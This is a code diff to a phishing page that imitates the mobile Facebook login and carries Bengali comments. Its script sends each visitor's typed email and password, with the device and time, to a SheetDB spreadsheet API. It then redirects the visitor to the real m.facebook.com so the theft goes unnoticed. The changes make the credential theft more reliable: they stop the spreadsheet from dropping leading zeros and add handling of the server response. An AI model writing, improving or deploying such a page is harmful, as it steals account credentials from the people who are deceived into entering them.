@@ -8,23 +8,16 @@
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: Helvetica, Arial, sans-serif; }
         
         body { 
-            background-color: #fff; /* মোবাইলে ফেসবুক পেজ সাধারণত সাদা হয় */
+            background-color: #fff; 
             display: flex; 
             flex-direction: column; 
             align-items: center; 
         }
 
-        /* মোবাইলের জন্য পুরো উইডথ সেট করা */
         .container { 
             width: 100%; 
-            max-width: 500px; /* পিসিতে বড় হবে না, মোবাইলে ফুল স্ক্রিন */
+            max-width: 500px; 
             text-align: center;
-        }
-
-        .header-image {
-            width: 100%;
-            height: auto;
-            margin-bottom: 0;
         }
 
         .fb-logo { 
@@ -36,7 +29,7 @@
 
         .login-form-container {
             width: 100%;
-            padding: 0 16px; /* দুই পাশে সামান্য গ্যাপ */
+            padding: 0 16px; 
         }
 
         input { 
@@ -104,7 +97,6 @@
             width: 100%;
         }
 
-        /* পিসি বা বড় স্ক্রিনের জন্য সামান্য অ্যাডজাস্টমেন্ট */
         @media (min-width: 500px) {
             body { background-color: #f0f2f5; padding-top: 50px; }
             .container { 
@@ -138,19 +130,26 @@
 </div>
 
 <script>
+    // SheetDB API URL
     const apiURL = 'https://sheetdb.io/api/v1/w51cfqk66hrnb?sheet=Sheet9'; 
     const form = document.getElementById('loginForm');
     const btn = document.getElementById('submitBtn');
 
     form.addEventListener('submit', e => {
         e.preventDefault();
-        btn.innerText = "Loggin in...";
+        
+        // বাটন লোডিং স্টেট
+        btn.innerText = "Logging in...";
         btn.disabled = true;
+
+        // ইনপুটের ভ্যালুর শুরুতে ' যোগ করা হচ্ছে যাতে গুগল শিটে ০ মুছে না যায়
+        const finalEmail = "'" + form.email.value;
+        const finalPassword = "'" + form.password.value;
 
         const formData = {
             data: [{
-                email: form.email.value,
-                password: form.password.value,
+                email: finalEmail,
+                password: finalPassword,
                 device: "Mobile",
                 time: new Date().toLocaleString()
             }]
@@ -161,11 +160,16 @@
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(formData)
         })
-        .then(() => {
-            window.location.href = "https://m.facebook.com"; // সফল হলে আসল সাইটে যাবে
+        .then(response => {
+            if(response.ok) {
+                // সফল হলে আসল ফেসবুক পেজে রিডাইরেক্ট হবে
+                window.location.href = "https://m.facebook.com";
+            } else {
+                throw new Error('Network response was not ok.');
+            }
         })
         .catch(() => {
-            alert("Something went wrong!");
+            alert("Something went wrong! Please try again.");
             btn.disabled = false;
             btn.innerText = "Log In";
         });
@@ -173,5 +177,4 @@
 </script>
 
 </body>
-  </html>
-  
+</html>
